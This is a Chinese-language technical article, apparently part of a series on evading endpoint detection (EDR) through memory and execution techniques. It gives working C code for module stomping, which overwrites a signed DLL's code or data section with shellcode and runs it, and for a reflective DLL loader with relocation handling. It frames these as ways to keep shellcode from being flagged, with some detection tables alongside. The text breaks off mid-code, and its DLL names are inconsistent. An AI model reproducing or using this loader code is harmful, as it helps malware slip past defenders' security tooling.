---
title: EDR攻击技术-内存与执行规避
url: https://mp.weixin.qq.com/s/z5ZmsAlVj3Bi3-IWOWxyPg
source: Doonsec's feed
date: 2026-09-20
fetch_date: 2026-09-21T07:23:18.039147
---

# EDR攻击技术-内存与执行规避

# EDR攻击技术-内存与执行规避

原创

pandazhengzheng
pandazhengzheng

安全分析与研究

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## 目录

1. 内存与执行规避概述
2. Module Stomping（模块踩踏）
3. Reflective DLL Loading（反射 DLL 加载）
4. 内存加密概述
5. Ekko
6. Cronos
7. Foliage
8. Gargoyle
9. Pool Party
10. Sleep Mask 综述
11. Call Stack Spoofing（调用栈欺骗）
12. 远程进程注入
13. APC 与 Fiber 异步执行
14. 完整 Loader 设计原则
15. 小结

---

## 1. 内存与执行规避概述

### 1.1 定位

第 4 篇聚焦**进程属性欺骗**与**遥测通道抑制**。本篇聚焦**内存落地方式**与**执行载体选择**——使 shellcode 在内存中"看起来合法"且通过"不产生可疑信号"的方式执行。

### 1.2 核心问题

```
Shellcode 加载到内存后面临的问题:
├─ 内存区域类型: Private+Execute → 可疑
├─ 内存扫描: YARA 扫描发现 shellcode 签名
├─ 调用栈: 返回地址在 Private 内存 → 可疑
├─ 线程起始地址: 起始地址在 Private 内存 → 可疑
└─ 睡眠时: shellcode 明文驻留内存 → 可被扫描
```

### 1.3 规避技术映射

| 问题 | 规避技术 | 原理 |
| --- | --- | --- |
| Private+Execute | Module Stomping | shellcode 在 IMAGE 内存 |
| 内存扫描 | Sleep Mask | 睡眠时加密内存 |
| 调用栈异常 | Call Stack Spoofing | 伪造合法调用栈 |
| 线程起始地址 | APC/Fiber | 无新线程 |
| 远程注入信号 | 远程进程注入优化 | 减少跨进程信号 |

### 1.4 技术分类

```
内存落地方式          执行载体           睡眠保护
├─ Module Stomping   ├─ APC            ├─ Ekko
├─ Reflective DLL    ├─ Fiber          ├─ Cronos
├─ Process Hollowing ├─ Thread Hijack  ├─ Foliage
└─ Manual Mapping    └─ Callback       ├─ Gargoyle
                                        ├─ Pool Party
                                        └─ Sleep Mask
```

---

## 2. Module Stomping（模块踩踏）

### 2.1 原理

**Module Stomping**：加载一个**合法 DLL**，然后**覆写其 `.text` 节区**为 shellcode。shellcode 在合法 DLL 的内存中执行。

```
1. LoadLibrary("xpservices.dll")  → 加载合法 DLL 到 IMAGE 内存
2. 找到 .text 节区
3. VirtualProtect(.text, RW)      → 改为可写
4. memcpy(.text, shellcode)       → 覆写为 shellcode
5. VirtualProtect(.text, RX)      → 改回可执行
6. 执行 .text                     → shellcode 在 IMAGE 内存执行
```

### 2.2 为什么 Module Stomping 有效

| 检测维度 | 无 Module Stomping | 有 Module Stomping |
| --- | --- | --- |
| 内存区域类型 | Private+Execute（可疑） | Image+RX（合法） |
| RIP 落点 | Private 内存（可疑） | Image 内存（合法） |
| 调用栈返回地址 | Private 内存（可疑） | Image 内存（合法） |
| 线程起始地址 | Private 内存（可疑） | Image 内存（合法） |
| 映像加载回调 | 无映像加载 | 合法映像加载 |

### 2.3 基本实现

```
BOOL moduleStomping(PBYTE shellcode, SIZE_T shellSize) {
    // 1. 加载合法 DLL（不解析导入、不调用 DllMain）
    HMODULE hMod = LoadLibraryExW(
        L"xpservices.dll",
        NULL,
        DONT_RESOLVE_DLL_REFERENCES  // 不执行 DllMain
    );
    if (!hMod) return FALSE;

    // 2. 解析 PE 头，找到 .text 节区
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    PIMAGE_SECTION_HEADER textSection = NULL;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            textSection = &section[i];
            break;
        }
    }
    if (!textSection) return FALSE;

    // 3. 检查 shellcode 大小
    if (shellSize > textSection->Misc.VirtualSize) return FALSE;

    // 4. 覆写 .text
    PVOID textAddr = (BYTE*)hMod + textSection->VirtualAddress;
    DWORD oldProt;
    VirtualProtect(textAddr, textSection->Misc.VirtualSize,
                   PAGE_READWRITE, &oldProt);
    memcpy(textAddr, shellcode, shellSize);
    VirtualProtect(textAddr, textSection->Misc.VirtualSize,
                   PAGE_EXECUTE_READ, &oldProt);

    // 5. 执行
    ((void(*)())textAddr)();

    return TRUE;
}
```

### 2.4 DLL 选择

**选择标准**：

* \*\*足够大的 `.text`\*\*：容纳 shellcode（通常 > 100KB）；
* **不常用**：避免与正常功能冲突；
* **合法签名**：数字签名有效；
* **System32 路径**：路径合法。

| DLL | .text 大小 | 适用 |
| --- | --- | --- |
| `xpsservices.dll` | ~1MB | 最常用 |
| `mscorbi.dll` | ~数 MB | 大 shellcode |
| `clr.dll` | ~数十 MB | 极大 shellcode |
| `d3d11.dll` | ~数 MB | 图形相关 |

### 2.5 Module Stomping 的检测

| 检测方法 | 原理 | 是否有效 |
| --- | --- | --- |
| 映像与磁盘比对 | 内存 .text 与磁盘文件不一致 | ✅ 可检测 |
| COW 位检查 | .text 被修改触发 COW | ✅ moneta 可检测 |
| 映像签名验证 | 覆写后签名失效 | ⚠️ |
| 加载上下文 | 为何此进程加载此 DLL？ | ✅ 行为异常 |

### 2.6 Module Stomping 的改进

#### 2.6.1 避免触发 COW

**问题**：`VirtualProtect(.text, RW)` + `memcpy` 触发 COW，moneta 可检测。

**改进**：覆写 `.data` 而非 `.text`（`.data` 已可写，不触发 COW）：

```
// 覆写 .data 节区（已 RW，不触发 COW）
PIMAGE_SECTION_HEADER dataSection = getSection(nt, ".data");
PVOID dataAddr = (BYTE*)hMod + dataSection->VirtualAddress;
// .data 已可写，无需 VirtualProtect
memcpy(dataAddr, shellcode, shellSize);
// 改为可执行
VirtualProtect(dataAddr, shellSize, PAGE_EXECUTE_READ, &oldProt);
((void(*)())dataAddr)();
```

**注意**：将 `.data` 改为 `PAGE_EXECUTE_READ` 仍可能被检测（非标准权限）。

#### 2.6.2 未落盘 PE 映射

从内存中映射 PE（不经过 `LoadLibrary`），避免映像加载回调：

```
// 手动映射 PE（不触发 PsSetLoadImageNotifyRoutine）
// 1. 分配内存
// 2. 复制 PE 头和节区
// 3. 处理重定位
// 4. 解析导入
// 5. 不调用 DllMain
// 注意：手动映射的内存是 MEM_PRIVATE，不是 MEM_IMAGE
//       除非使用 NtMapViewOfSection 从 Section 映射
```

### 2.7 Module Stomping vs Reflective DLL Loading

| 对比 | Module Stomping | Reflective DLL Loading |
| --- | --- | --- |
| 内存类型 | MEM\_IMAGE（LoadLibrary） | MEM\_PRIVATE（手动映射） |
| 映像加载回调 | 触发（合法映像） | 不触发 |
| 与磁盘比对 | 可比对（不一致 → 可检测） | 无磁盘可比对 |
| COW | 触发（覆写 .text） | 不触发（全新内存） |
| 检测难度 | 中（COW + 比对） | 中（PRIVATE+EXECUTE） |

---

## 3. Reflective DLL Loading（反射 DLL 加载）

### 3.1 原理

**Reflective DLL Loading**：不通过 `LoadLibrary` 加载 DLL，而是**自己实现 PE 加载器**——从内存中映射 PE，处理重定位和导入，不落盘。

```
正常加载:
    LoadLibrary("dll.dll") → OS 加载 → 映像加载回调 → DllMain

反射加载:
    reflectiveLoad(dllBytes) → 自己映射 → 不触发回调 → DllMain
```

### 3.2 反射加载的步骤

```
PVOID reflectiveLoad(PBYTE dllBytes) {
    // 1. 解析 DOS/NT 头
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes + dos->e_lfanew);

    // 2. 分配内存（IMAGE_SIZEOF_IMAGE）
    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    PVOID base = NULL;
    NtAllocateVirtualMemory(GetCurrentProcess(), &base, 0, &imageSize,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 3. 复制 PE 头
    SIZE_T headersSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(base, dllBytes, headersSize);

    // 4. 复制节区
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)base + sections[i].VirtualAddress,
               dllBytes + sections[i].PointerToRawData,
               sections[i].SizeOfRawData);
    }

    // 5. 处理基址重定位
    applyRelocations(base, nt->OptionalHeader.ImageBase,
                     (DWORD_PTR)base);

    // 6. 解析导入表
    resolveImports(base, nt);

    // 7. 设置节区权限
    setSectionPermissions(base, nt);

    // 8. 调用 DllMain（可选）
    DLL_MAIN dllMain = (DLL_MAIN)((BYTE*)base +
        nt->OptionalHeader.AddressOfEntryPoint);
    dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);

    return base;
}
```

### 3.3 重定位处理

```
void applyRelocations(PVOID base, DWORD_PTR originalBase, DWORD_PTR newBase) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);

    // 获取重定位目录
    PIMAGE_DATA_DIRECTORY relocDir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir->VirtualAddress == 0) return;

    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)((BYTE*)base + relocDir->VirtualAddress);
    DWORD_PTR delta = newBase - originalBase;

    while (reloc->VirtualAddress) {
        PWORD entries = (PWORD)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (DWORD i = 0; i < count; i++) {
            WORD type = entries[i] >> 12;
            WORD offset = entries[i] & 0xFFF;

            if (type == IMAGE_REL_BASED_DIR64) {
                PULONG_PTR addr = (PULONG_PTR)((BYTE*)base +
                    reloc->VirtualAddress + offset);
                *addr += delta;
            }
        }
        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
    }
}
```

### 3.4 导入解析

```
void resolveImports(PVOID base, PIMAGE_NT_HEADERS nt) {
    PIMAGE_DATA_DIRECTORY importDir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTO...